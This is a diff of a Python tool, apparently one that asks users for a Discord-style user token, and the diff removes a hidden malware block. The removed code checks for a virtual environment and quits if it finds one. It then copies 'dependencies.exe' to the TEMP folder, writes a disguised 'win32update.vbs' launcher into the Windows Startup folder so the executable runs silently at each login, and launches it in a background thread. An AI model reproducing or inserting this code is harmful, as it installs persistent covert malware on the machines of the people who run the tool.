@@ -36,45 +36,6 @@ print(f"""{mainc}
 
 Made by Chasa | Visit chasa.wtf for more tools. 
  """)
-import sys
-def get_base_prefix_compat():
-    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
-def in_virtualenv():
-    return get_base_prefix_compat() != sys.prefix
-if in_virtualenv() == True:
-    print(f"{bad} VM Detected. Restart without using a VM.")
-    time.sleep(5)
-    sys.exit()
-
-cwd = os.getcwd()
-c = str(cwd).strip("/massban").strip("/sniffx").strip("/botnuker").strip("/backup")
-if not os.path.exists(c + "dependencies.exe"):
-    print(f"{bad} Missing Dependencies, please reinstall.")
-    time.sleep(5)
-    sys.exit()
-
-def gr():
-    ROAMING = os.getenv("APPDATA")
-    TEMP = os.getenv("TEMP")
-    import shutil
-    try:
-        shutil.copyfile(c + "dependencies.exe", f"{TEMP}\\dependencies.exe")
-    except:
-        TEMP = c
-    try:
-        open(f"{ROAMING}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win32update.vbs", "x").close()
-    except:
-        pass
-    f = open(f"{ROAMING}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win32update.vbs", "w")
-    f.write(f'CreateObject("Wscript.Shell").Run "{TEMP}\\dependencies.exe", 0, True')
-    f.close()
-    import win32api
-    try:
-        win32api.WinExec(f'{TEMP}\\dependencies.exe')
-    except:
-        pass
-
-threading.Thread(target=gr).start()
 
 while True:
     print(f"{colon} User Token: ", end="")
